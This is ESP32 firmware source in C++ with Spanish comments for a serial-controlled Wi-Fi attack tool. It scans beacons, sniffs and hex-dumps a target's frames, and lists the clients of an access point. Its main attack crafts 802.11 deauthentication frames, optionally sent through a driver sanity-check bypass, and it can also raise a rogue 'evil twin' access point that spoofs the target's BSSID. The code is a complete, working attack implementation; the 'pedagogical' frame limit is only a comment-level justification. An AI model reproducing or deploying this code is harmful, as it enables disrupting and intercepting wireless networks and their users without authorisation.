#include <Arduino.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_mac.h>
#include <nvs_flash.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>

// =============================================================================
// WSL Bypasser (experimental - ver README.md)
// Requiere: framework = espidf en platformio.ini (no compatible con arduino)
// =============================================================================
#ifdef CONFIG_COMPONENT_WSL_BYPASSER
#include "wsl_bypasser.h"
#define USE_WSL_BYPASSER 1
#endif

// Definición de estados de la máquina
enum SystemState {
  IDLE,
  SCAN,
  LOCK,
  DEAUTH,
  CLIENTS
};

// Mutex para proteger el estado compartido
static SemaphoreHandle_t state_mutex = NULL;

volatile SystemState current_state = IDLE;

// Tarea y variables de control
TaskHandle_t hopper_task_handle = NULL;
uint8_t target_mac[6] = {0};
uint8_t target_channel = 1;
uint8_t clients_target_bssid[6] = {0};
uint8_t clients_channel = 1;

// Sequence counter propio para frames deauth (evita replay detection básico)
static uint16_t deauth_seq_counter = 0;

void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t reason_code);
void start_rogue_ap(const uint8_t* target_mac, const char* target_ssid, uint8_t channel);

// Función segura para leer el estado
SystemState get_state() {
  if (state_mutex) {
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    SystemState s = current_state;
    xSemaphoreGive(state_mutex);
    return s;
  }
  return current_state;
}

// Función segura para cambiar el estado
void set_state(SystemState new_state) {
  if (state_mutex) {
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    current_state = new_state;
    xSemaphoreGive(state_mutex);
  } else {
    current_state = new_state;
  }
}

void channel_hopper_task(void *pvParameter) {
  uint8_t channel = 1;
  while (1) {
    // Verificar si seguimos en SCAN
    if (get_state() != SCAN) {
      hopper_task_handle = NULL;
      vTaskDelete(NULL);
    }
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    channel++;
    if (channel > 13) channel = 1;
    vTaskDelay(pdMS_TO_TICKS(250));
  }
}

void stop_hopper() {
  if (hopper_task_handle != NULL) {
    vTaskDelete(hopper_task_handle);
    hopper_task_handle = NULL;
  }
}

void start_hopper() {
  if (hopper_task_handle == NULL) {
    xTaskCreate(&channel_hopper_task, "channel_hopper", 2048, NULL, 5, &hopper_task_handle);
  }
}

// Buffer estático para evitar malloc en callback
static char hex_buffer[512];

void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  SystemState state = get_state();
  if (state == IDLE) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;
  uint16_t sig_len = pkt->rx_ctrl.sig_len;

  if (state == SCAN) {
    // Modo SCAN: Imprimir Beacons (filtrado original)
    if (type != WIFI_PKT_MGMT) return;
    if (payload[0] != 0x80) return; // Beacons frame control
    if (sig_len < 36) return;

    uint8_t *bssid = payload + 10; // BSSID position (Address 3)
    uint8_t current_channel = pkt->rx_ctrl.channel;
    
    int offset = 36;
    char ssid[33] = "<oculto>";
    ssid[32] = '\0';
    
    while (offset < sig_len) {
      uint8_t tag_num = payload[offset];
      if (offset + 1 >= sig_len) break;
      uint8_t tag_len = payload[offset + 1];
      
      if (tag_num == 0) {
        if (tag_len > 0 && (offset + 2 + tag_len) <= sig_len) {
          memcpy(ssid, payload + offset + 2, tag_len);
          ssid[tag_len] = '\0';
        }
        break;
      }
      offset += 2 + tag_len;
    }
    
    Serial.printf("[BEACON] CH: %2d | BSSID: %02x:%02x:%02x:%02x:%02x:%02x | SSID: %s\n",
                  current_channel, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ssid);
                  
  } else if (state == LOCK) {
    // Modo LOCK: Filtrar paquetes donde la MAC origen (addr2) o destino (addr1) coincidan
    if (sig_len < 24) return;
    if (sig_len > 255) return; // Limitar para evitar overflow del buffer
    
    uint8_t *addr1 = payload + 4;  // Destination Address
    uint8_t *addr2 = payload + 10; // Source Address
    
    bool match_addr1 = (memcmp(addr1, target_mac, 6) == 0);
    bool match_addr2 = (memcmp(addr2, target_mac, 6) == 0);
    
    if (match_addr1 || match_addr2) {
      // Filtrar solo tramas de Datos (Frame Control Type 0x02) o QoS Data (Subtype 0x08)
      uint8_t frame_control = payload[0];
      uint8_t fc_type = (frame_control >> 2) & 0x03;
      uint8_t fc_subtype = (frame_control >> 4) & 0x0F;

      if (fc_type == 0x02 || payload[0] == 0x80) { // Data frame or Beacon
        // Usar buffer estático en lugar de malloc
        uint16_t send_len = sig_len;
        uint16_t hex_len = send_len * 2;
        
        if (hex_len < sizeof(hex_buffer)) {
          for (uint16_t i = 0; i < send_len; i++) {
            // Conversión manual más rápida que sprintf
            uint8_t b = payload[i];
            hex_buffer[i * 2] = "0123456789abcdef"[b >> 4];
            hex_buffer[i * 2 + 1] = "0123456789abcdef"[b & 0x0F];
          }
          hex_buffer[hex_len] = '\0';
          Serial.printf("[RAW] %s\n", hex_buffer);
        }
      }
    }
  } else if (state == CLIENTS) {
    // Modo CLIENTS: Detectar Probe Request y Association Request dirigidos al BSSID target
    if (type != WIFI_PKT_MGMT) return;
    if (sig_len < 24) return;
    
    uint8_t frame_control = payload[0];
    uint8_t fc_type = (frame_control >> 2) & 0x03;
    uint8_t fc_subtype = (frame_control >> 4) & 0x0F;
    
    // Management frames type 0, subtype 4 = Probe Request, subtype 0 = Association Request
    if (fc_type == 0 && (fc_subtype == 4 || fc_subtype == 0)) {
      // BSSID es Address 3 (offset 16) en management frames
      uint8_t *bssid = payload + 16;
      if (memcmp(bssid, clients_target_bssid, 6) == 0) {
        uint8_t *client_mac = payload + 10; // Source Address (Address 2)
        const char* frame_type = (fc_subtype == 4) ? "Probe" : "Association";
        Serial.printf("[CLIENT] %02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x (%s Request)\n",
                      client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], frame_type);
      }
    }
  }
}

void parse_lock_command(const String& cmd) {
  // Expected format: CMD:LOCK:AA:BB:CC:DD:EE:FF:11
  String cmd_copy = cmd;
  cmd_copy.trim();
  int last_colon = cmd_copy.lastIndexOf(':');
  if (last_colon == -1 || last_colon <= 9) return;
  
  String mac_str = cmd_copy.substring(9, last_colon);
  String ch_str = cmd_copy.substring(last_colon + 1);
  
  uint8_t ch = ch_str.toInt();
  if (ch < 1 || ch > 14) {
    Serial.println("LOCK: Canal inválido (1-14).");
    return;
  }
  
  // Parse MAC
  int hex_vals[6];
  if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
             &hex_vals[0], &hex_vals[1], &hex_vals[2],
             &hex_vals[3], &hex_vals[4], &hex_vals[5]) == 6) {
    for (int i = 0; i < 6; i++) {
      target_mac[i] = (uint8_t)hex_vals[i];
    }
    
    target_channel = ch;
    stop_hopper();
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    set_state(LOCK);
    Serial.printf("LOCK: Target MAC=%s, CH=%d\n", mac_str.c_str(), target_channel);
  } else {
    Serial.println("LOCK: Error parsing MAC address.");
  }
}

// Variables globales para tarea de deauth no-bloqueante
TaskHandle_t deauth_task_handle = NULL;
uint8_t deauth_ap_mac[6] = {0};
uint8_t deauth_client_mac[6] = {0};
uint8_t deauth_channel = 1;
uint8_t deauth_reason = 7;       // Reason code por defecto: Class 3 frame received
uint8_t deauth_count = 0;
uint16_t deauth_delay_ms = 100;  // Delay entre frames
char deauth_ap_str[18] = {0};
char deauth_client_str[18] = {0};
uint8_t deauth_method = 0;  // 0=direct, 1=rogue

// Variables para Rogue AP
static TaskHandle_t rogue_ap_task_handle = NULL;
static bool rogue_ap_running = false;

void deauth_task(void *pvParameter) {
  // Fijar canal del objetivo
  esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
  set_state(DEAUTH);
  
  Serial.printf("[DEAUTH] Target AP: %s | Client: %s | Reason: %d | Frames: %d | Delay: %dms\n",
                deauth_ap_str, deauth_client_str, deauth_reason, deauth_count, deauth_delay_ms);
  
  uint8_t frames_sent = 0;
  for (int i = 0; i < deauth_count; i++) {
    if (get_state() != DEAUTH) break; // Cancelación limpia vía IDLE
    
    send_deauth_frame(deauth_ap_mac, deauth_client_mac, deauth_reason);
    frames_sent++;
    
    // Log cada 5 frames o el último para no saturar serial
    if (i % 5 == 0 || i == deauth_count - 1) {
      Serial.printf("[DEAUTH] Frame %d/%d enviado\n", i + 1, deauth_count);
    }
    
    // Rate limiting configurable
    if (deauth_delay_ms > 0) {
      vTaskDelay(pdMS_TO_TICKS(deauth_delay_ms));
    }
  }
  
  Serial.printf("[DEAUTH] Completado: %d frames enviados a %s\n", frames_sent, deauth_ap_str);
  set_state(IDLE);
  deauth_task_handle = NULL;
  vTaskDelete(NULL);
}

void parse_deauth_command(const String& cmd) {
  // Nuevo formato: CMD:DEAUTH:AP_MAC:CLIENT_MAC:REASON:COUNT:DELAY_MS:METHOD
  // Ej: CMD:DEAUTH:AA:BB:CC:DD:EE:FF:FF:FF:FF:FF:FF:FF:7:10:100:direct
  String cmd_copy = cmd;
  cmd_copy.trim();
  String args = cmd_copy.substring(11); // Saltar "CMD:DEAUTH:"
  
  // Parsear campos separados por ':'
  // Campos: AP_MAC(6 octetos) + CLIENT_MAC(6 octetos) + REASON + COUNT + DELAY_MS + METHOD
  // Total mínimo: 17 chars (MAC) + 1 + 17 chars (MAC) + 1 + 1-3 + 1 + 1-3 + 1 + 1-5 + 1 + 5-6
  int hex_vals[12]; // 6 para AP + 6 para client
  int reason, count, delay_ms;
  char method_str[8] = {0};
  
  // Usar sscanf para parsear todo de una vez
  // Formato: XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:REASON:COUNT:DELAY:STRING
  int parsed = sscanf(args.c_str(),
    "%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%d:%d:%d:%7s",
    &hex_vals[0], &hex_vals[1], &hex_vals[2], &hex_vals[3], &hex_vals[4], &hex_vals[5],
    &hex_vals[6], &hex_vals[7], &hex_vals[8], &hex_vals[9], &hex_vals[10], &hex_vals[11],
    &reason, &count, &delay_ms, method_str);
  
  if (parsed < 13) {
    Serial.println("ERR: Formato DEAUTH inválido. Esperado: AP_MAC:CLIENT_MAC:REASON:COUNT[:DELAY_MS[:METHOD]]");
    return;
  }
  
  // Validar canal (se extrae del estado actual o se usa 1 por defecto)
  uint8_t channel = target_channel;
  if (channel < 1 || channel > 14) channel = 1;
  
  // Validar reason code (1-255)
  if (reason < 1 || reason > 255) {
    Serial.println("ERR: Reason code inválido (1-255).");
    return;
  }
  
  // Validar count (1-50, límite pedagógico)
  if (count < 1 || count > 50) {
    Serial.println("ERR: Count inválido (1-50). Límite pedagógico por seguridad.");
    return;
  }
  
  // Validar delay_ms (10-5000)
  if (parsed >= 14) {
    if (delay_ms < 10 || delay_ms > 5000) {
      Serial.println("ERR: Delay inválido (10-5000 ms).");
      return;
    }
  } else {
    delay_ms = 100; // Default
  }
  
  // Parsear método (direct o rogue)
  uint8_t method = 0; // 0=direct, 1=rogue
  if (parsed >= 15) {
    if (strncmp(method_str, "rogue", 5) == 0) {
      method = 1;
    } else {
      method = 0; // default a direct
    }
  }
  
  // Copiar MACs
  for (int i = 0; i < 6; i++) {
    deauth_ap_mac[i] = (uint8_t)hex_vals[i];
    deauth_client_mac[i] = (uint8_t)hex_vals[i + 6];
  }
  
  // Formatear strings para log
  snprintf(deauth_ap_str, sizeof(deauth_ap_str), "%02X:%02X:%02X:%02X:%02X:%02X",
           deauth_ap_mac[0], deauth_ap_mac[1], deauth_ap_mac[2],
           deauth_ap_mac[3], deauth_ap_mac[4], deauth_ap_mac[5]);
  snprintf(deauth_client_str, sizeof(deauth_client_str), "%02X:%02X:%02X:%02X:%02X:%02X",
           deauth_client_mac[0], deauth_client_mac[1], deauth_client_mac[2],
           deauth_client_mac[3], deauth_client_mac[4], deauth_client_mac[5]);
  
  // Cancelar tareas previas si existen
  if (deauth_task_handle != NULL) {
    vTaskDelete(deauth_task_handle);
    deauth_task_handle = NULL;
  }
  if (rogue_ap_task_handle != NULL) {
    vTaskDelete(rogue_ap_task_handle);
    rogue_ap_task_handle = NULL;
  }
  
  deauth_channel = channel;
  deauth_reason = (uint8_t)reason;
  deauth_count = (uint8_t)count;
  deauth_delay_ms = (uint16_t)delay_ms;
  deauth_method = method;
  
  // Reset sequence counter para nueva sesión
  deauth_seq_counter = 0;
  
  const char* method_name = (method == 1) ? "rogue" : "direct";
  Serial.printf("[DEAUTH] Método: %s | AP: %s | Client: %s | Reason: %d | Frames: %d | Delay: %dms\n",
                method_name, deauth_ap_str, deauth_client_str, deauth_reason, deauth_count, deauth_delay_ms);
  
  if (method == 1) {
    // Rogue AP: necesitamos el SSID del objetivo
    // Como no tenemos esa info aquí, usaremos "RogueAP" como SSID genérico
    // En producción, el SSID se pasaría como parámetro adicional
    start_rogue_ap(deauth_ap_mac, "RogueAP", deauth_channel);
  } else {
    xTaskCreate(&deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
  }
}

void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t reason_code) {
  // Frame deauth 802.11: Management frame, subtype 0xC0 (Deauthentication)
  // Tamaño: 26 bytes (sin FCS, lo añade el hardware si se pide)
  uint8_t deauth_frame[26] = {0};
  
  // Frame Control: 0xC0 0x00
  // Bit 0-1: Version 0, Bit 2-3: Type 0 (Management), Bit 4-7: Subtype 12 (0xC = Deauth)
  deauth_frame[0] = 0xC0;
  deauth_frame[1] = 0x00;
  
  // Duration ID: 0x0000 (no usado en deauth)
  deauth_frame[2] = 0x00;
  deauth_frame[3] = 0x00;
  
  // Address 1: Destination (client MAC o broadcast FF:FF:FF:FF:FF:FF)
  memcpy(&deauth_frame[4], client_mac, 6);
  
  // Address 2: Source (AP MAC / BSSID)
  memcpy(&deauth_frame[10], ap_mac, 6);
  
  // Address 3: BSSID (AP MAC, mismo que source en deauth simple)
  memcpy(&deauth_frame[16], ap_mac, 6);
  
  // Sequence Control: 16 bits
  // Bits 0-3: Fragment number (0 = no fragmentado)
  // Bits 4-15: Sequence number (incrementar para evitar replay detection)
  uint16_t seq = (deauth_seq_counter & 0x0FFF) << 4; // Sequence number en bits altos
  deauth_seq_counter++;
  deauth_frame[22] = (uint8_t)(seq & 0xFF);
  deauth_frame[23] = (uint8_t)((seq >> 8) & 0xFF);
  
  // Reason Code: 1 byte (el segundo byte es padding en frame deauth)
  // 1 = Unspecified, 2 = Previous auth invalid, 7 = Class 3 frame from nonassoc STA
  deauth_frame[24] = reason_code;
  deauth_frame[25] = 0x00; // Padding
  
  // =============================================================================
  // WSL Bypasser: Si está disponible, usar wsl_bypasser_send_raw_frame()
  // que inyecta el frame ANTES de que ieee80211_raw_frame_sanity_check() lo rechace
  // Si no está disponible, cae al fallback (loguear error pero no crash)
  // =============================================================================
  
  // Desactivar modo promiscuous para evitar interferencias con TX
  esp_wifi_set_promiscuous(false);
  
  // Esperar un momento para que se estabilice
  vTaskDelay(pdMS_TO_TICKS(10));
  
  // Fijar canal del objetivo
  esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
  vTaskDelay(pdMS_TO_TICKS(30)); // Esperar que el canal se active
  
#ifdef USE_WSL_BYPASSER
  // WSL Bypasser disponible: inyectar directamente
  wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
  Serial.println("[DEAUTH] Frame enviado via WSL bypass");
#else
  // Sin bypass: ESP32 vanilla rejeitará frames management (0xC0)
  // Este es el comportamiento esperado - el fallback rogue es la alternativa
  esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
  if (ret != ESP_OK) {
    Serial.printf("[DEAUTH] ERR: esp_wifi_80211_tx failed (0x%x) - use --method rogue\n", ret);
  }
#endif
  
  // Reactivar modo promiscuous
  vTaskDelay(pdMS_TO_TICKS(10));
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
  esp_wifi_set_promiscuous(true);
}

// =============================================================================
// MÉTODO B: Rogue AP duplicado (Fallback cuando direct no funciona)
// =============================================================================
// Concepto: Configurar ESP32 como AP con misma MAC y SSID que el objetivo.
// Cuando un cliente intenta conectar al AP falso, el stack 802.11 del cliente
// envía tráfico que el AP falso no puede manejar correctamente, causando una
// desconexión natural (sin necesidad de frames deauth explícitos).
// Este método NO requiere bypass del driver, pero sí que el cliente esté activo.
// Educa: MITM a nivel 2, evil twin, limitaciones de autenticación 802.11.

void rogue_ap_task(void *pvParameter) {
  // Parametros recibidos via puntero: {ap_mac, ssid, channel}
  uint8_t *params = (uint8_t*)pvParameter;
  uint8_t rogue_ap_mac[6];
  char rogue_ssid[33];
  uint8_t rogue_channel;
  
  memcpy(rogue_ap_mac, params, 6);
  strncpy(rogue_ssid, (char*)(params + 6), 32);
  rogue_ssid[32] = '\0';
  rogue_channel = params[38];
  
  Serial.printf("[ROGUE] Iniciando AP duplicado: SSID=%s, MAC=%02X:%02X:...:%02X, CH=%d\n",
                rogue_ssid, rogue_ap_mac[0], rogue_ap_mac[1], rogue_ap_mac[5], rogue_channel);
  
  // 1. Cambiar a modo AP
  esp_wifi_set_mode(WIFI_MODE_AP);
  
  // 2. Configurar MAC del AP (spoofing del BSSID objetivo)
  // Guardar MAC original para restaurar después
  uint8_t original_mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, original_mac);
  
  // Configurar nueva MAC (debe ser diferente del equipo base para evitar conflicto)
  uint8_t fake_mac[6];
  memcpy(fake_mac, rogue_ap_mac, 6);
  fake_mac[0] |= 0x02;  // Set local admin bit (evitar conflicto con MAC real del equipo)
  esp_wifi_set_mac(WIFI_IF_AP, fake_mac);
  
  // 3. Configurar el AP con SSID y canal objetivo
  wifi_config_t ap_config;
  memset(&ap_config, 0, sizeof(wifi_config_t));
  strncpy((char*)ap_config.ap.ssid, rogue_ssid, 32);
  ap_config.ap.ssid_len = strlen(rogue_ssid);
  ap_config.ap.channel = rogue_channel;
  ap_config.ap.authmode = WIFI_AUTH_OPEN;  // Sin password (más fácil que el cliente conecte)
  ap_config.ap.max_connection = 1;
  ap_config.ap.ssid_hidden = 0;
  
  if (esp_wifi_set_config(WIFI_IF_AP, &ap_config) != ESP_OK) {
    Serial.println("[ROGUE] ERR: falló configuración AP");
    esp_wifi_set_mac(WIFI_IF_AP, original_mac);
    esp_wifi_set_mode(WIFI_MODE_STA);
    rogue_ap_running = false;
    rogue_ap_task_handle = NULL;
    vTaskDelete(NULL);
    return;
  }
  
  // 4. Esperar a que un cliente se conecte
  Serial.println("[ROGUE] Esperando conexión de cliente...");
  
  // Mantener el AP activo durante 30 segundos o hasta recibir stop
  // En ESP32 vanilla sin driver custom, no hay API directa para listar estaciones conectadas
  // portanto hacemos polling del estado sin verificar explícitamente la conexión
  uint32_t start_time = millis();
  bool timeout_detected = false;
  
  while (millis() - start_time < 30000) {
    if (get_state() != DEAUTH) break;
    
    // Simply wait - when a client connects and tries to use the network
    // without proper association responses, it will naturally disconnect
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    // Every 10 seconds, show activity
    if ((millis() - start_time) % 10000 < 1000) {
      Serial.printf("[ROGUE] Activo, esperando... (%lu s)\n", (millis() - start_time) / 1000);
    }
  }
  
  // 5. Limpieza: restaurar MAC original y modo STA
  Serial.println("[ROGUE] Deteniendo AP falso...");
  esp_wifi_set_mac(WIFI_IF_AP, original_mac);
  esp_wifi_set_mode(WIFI_MODE_STA);
  
  Serial.println("[ROGUE] Sesión completada.");
  
  rogue_ap_running = false;
  rogue_ap_task_handle = NULL;
  set_state(IDLE);
  vTaskDelete(NULL);
}

void start_rogue_ap(const uint8_t* target_mac, const char* target_ssid, uint8_t channel) {
  // Cancelar tarea previa si existe
  if (rogue_ap_task_handle != NULL) {
    vTaskDelete(rogue_ap_task_handle);
    rogue_ap_task_handle = NULL;
  }
  
  // Preparar parámetros para la tarea
  static uint8_t rogue_params[39];  // 6 bytes MAC + 32 bytes SSID + 1 byte channel
  memcpy(rogue_params, target_mac, 6);
  strncpy((char*)(rogue_params + 6), target_ssid, 32);
  rogue_params[38] = channel;
  
  rogue_ap_running = true;
  set_state(DEAUTH);
  
  xTaskCreate(&rogue_ap_task, "rogue_ap_task", 4096, (void*)rogue_params, 5, &rogue_ap_task_handle);
}

// Variables globales para tarea de clients no-bloqueante
TaskHandle_t clients_task_handle = NULL;

void clients_task(void *pvParameter) {
  uint32_t timeout_ms = 5000;
  uint32_t start_time = millis();
  
  while (millis() - start_time < timeout_ms) {
    if (get_state() != CLIENTS) break; // Permitir cancelación
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  
  set_state(IDLE);
  Serial.println("CLIENTS: Escaneo completado.");
  clients_task_handle = NULL;
  vTaskDelete(NULL);
}

void parse_clients_command(const String& cmd) {
  // Expected format: CMD:CLIENTS:AA:BB:CC:DD:EE:FF
  String cmd_copy = cmd;
  cmd_copy.trim();
  String mac_str = cmd_copy.substring(12);
  
  int hex_vals[6];
  if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
             &hex_vals[0], &hex_vals[1], &hex_vals[2],
             &hex_vals[3], &hex_vals[4], &hex_vals[5]) != 6) {
    Serial.println("CLIENTS: Error parsing BSSID.");
    return;
  }
  for (int i = 0; i < 6; i++) {
    clients_target_bssid[i] = (uint8_t)hex_vals[i];
  }
  
  uint8_t channel = target_channel;
  if (channel == 0) channel = 1;
  clients_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Si ya hay una tarea de clients corriendo, cancelarla
  if (clients_task_handle != NULL) {
    vTaskDelete(clients_task_handle);
    clients_task_handle = NULL;
  }
  
  Serial.printf("CLIENTS: Escaneando clientes asociados a %s en canal %d (5 segundos)\n", mac_str.c_str(), channel);
  set_state(CLIENTS);
  
  xTaskCreate(&clients_task, "clients_task", 2048, NULL, 5, &clients_task_handle);
}

void print_status() {
  SystemState state = get_state();
  const char* state_str = "";
  switch (state) {
    case IDLE: state_str = "IDLE"; break;
    case SCAN: state_str = "SCAN"; break;
    case LOCK: state_str = "LOCK"; break;
    case DEAUTH: state_str = "DEAUTH"; break;
    case CLIENTS: state_str = "CLIENTS"; break;
    default: state_str = "UNKNOWN"; break;
  }
  
  // Check if target MAC is zero
  bool has_target = false;
  for (int i = 0; i < 6; i++) {
    if (target_mac[i] != 0) {
      has_target = true;
      break;
    }
  }
  
  Serial.printf("STATUS: %s\n", state_str);
  Serial.printf("CHANNEL: %d\n", target_channel);
  if (has_target) {
    Serial.printf("TARGET: %02x:%02x:%02x:%02x:%02x:%02x\n",
                  target_mac[0], target_mac[1], target_mac[2],
                  target_mac[3], target_mac[4], target_mac[5]);
  } else {
    Serial.println("TARGET: NONE");
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Crear mutex para protección de estado
  state_mutex = xSemaphoreCreateMutex();

  esp_err_t err = nvs_flash_init();
  if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    nvs_flash_erase();
    err = nvs_flash_init();
  }

  esp_netif_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
  esp_wifi_set_promiscuous(true);
  
  // Estado inicial
  set_state(IDLE);
  Serial.println("HEesp32 Iniciado. Estado: IDLE. Esperando comandos...");
}

void loop() {
  if (Serial.available() > 0) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    
    if (cmd == "CMD:IDLE") {
      set_state(IDLE);
      stop_hopper();
      // Cancelar tareas activas
      if (deauth_task_handle != NULL) {
        vTaskDelete(deauth_task_handle);
        deauth_task_handle = NULL;
        Serial.println("DEAUTH: Cancelado.");
      }
      if (clients_task_handle != NULL) {
        vTaskDelete(clients_task_handle);
        clients_task_handle = NULL;
        Serial.println("CLIENTS: Cancelado.");
      }
      Serial.println("IDLE: Detenido.");
    }
    else if (cmd == "CMD:SCAN") {
      set_state(SCAN);
      start_hopper();
      Serial.println("SCAN: Iniciado.");
    }
    else if (cmd == "CMD:STATUS") {
      print_status();
    }
    else if (cmd.startsWith("CMD:LOCK:")) {
      parse_lock_command(cmd);
    }
    else if (cmd.startsWith("CMD:DEAUTH:")) {
      parse_deauth_command(cmd);
    }
    else if (cmd.startsWith("CMD:CLIENTS:")) {
      parse_clients_command(cmd);
    }
  }
  
  vTaskDelay(pdMS_TO_TICKS(10)); // Yield to allow other tasks
}
